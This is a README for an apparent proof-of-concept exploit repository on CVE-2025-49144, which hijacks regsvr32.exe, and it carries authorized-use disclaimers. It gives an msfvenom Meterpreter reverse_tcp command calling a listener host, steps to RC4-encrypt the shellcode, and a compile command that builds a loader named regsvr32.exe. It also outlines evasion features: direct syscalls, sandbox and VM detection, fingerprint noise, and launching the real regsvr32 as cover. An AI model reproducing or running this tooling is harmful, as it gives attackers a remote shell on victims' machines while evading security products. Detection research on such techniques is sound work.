# CVE-2025-49144 — Educational PoC (`regsvr32` LOLBIN)

> **Educational / authorized testing only.**  
> This repository is a research PoC for understanding a local `regsvr32.exe` hijacking path (LOLBIN).  
> Use only on systems you own or have **explicit written authorization** to test.  
> Unauthorized use is illegal. The author assumes no liability for misuse.

---

## Context

PoC exploring **CVE-2025-49144** via local diversion of `regsvr32.exe`, with encrypted shellcode handled in memory and direct syscalls generated via [SysWhispers3](https://github.com/klezVirus/SysWhispers3).

Goal: document techniques for **blue-team awareness**, detection engineering, and controlled lab study — not production offensive tooling.

---

## Scope & ethics

| Allowed | Not allowed |
|--------|-------------|
| Your own lab / VMs | Third-party systems without consent |
| Authorized pentest / coursework | Distribution as malware |
| Defensive research & detection | Circumventing security controls in the wild |

If you are unsure whether your use case is authorized: **do not run this**.

---

## Prerequisites

- Python 3.x
- `msfvenom` (Metasploit Framework)
- MinGW-w64 (`x86_64-w64-mingw32-gcc`)
- Isolated Windows **lab** environment

---

## High-level flow

1. Prepare shellcode for a controlled lab listener  
2. Format & RC4-encrypt it into a C header  
3. Build a loader that decrypts/executes in memory and launches legitimate `regsvr32.exe` as cover  

### Lab generation (authorized environments only)

```bash
# 1) Shellcode (replace LHOST/LPORT with your lab values)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f c -o shellcode.txt

# 2) Format for Python
python3 format_shellcode_txt.py
# Copy output into rc4_shellcode.py

# 3) Generate encrypted_payload.h
python3 rc4_shellcode.py

# 4) Compile loader
x86_64-w64-mingw32-gcc loader.c syscalls.c syscalls.obj -o regsvr32.exe -mwindows -s -O2
```

---

## Repository layout

| File | Role |
|------|------|
| `format_shellcode_txt.py` | Formats raw shellcode for the encryptor |
| `rc4_shellcode.py` | RC4 encrypt + emits `encrypted_payload.h` |
| `loader.c` | In-memory decrypt / execute orchestration |
| `syscalls.*` | Direct syscalls (SysWhispers3) |
| `encrypted_payload.h` | Generated encrypted payload header |

---

## Loader notes (`loader.c`)

- **`rc4()`** — in-memory RC4 decrypt  
- **`junk()`** — trivial fingerprint noise  
- **`is_sandbox_environment()`** — optional sandbox/VM heuristics (RAM, CPU, uptime, common hypervisor strings)  
- **`WinMain()`** — allocate → decrypt → protect → execute → spawn real `regsvr32.exe` → exit via syscall  

---

## License

MIT — see [LICENSE](./LICENSE).

Research use does **not** grant permission to attack systems without authorization.
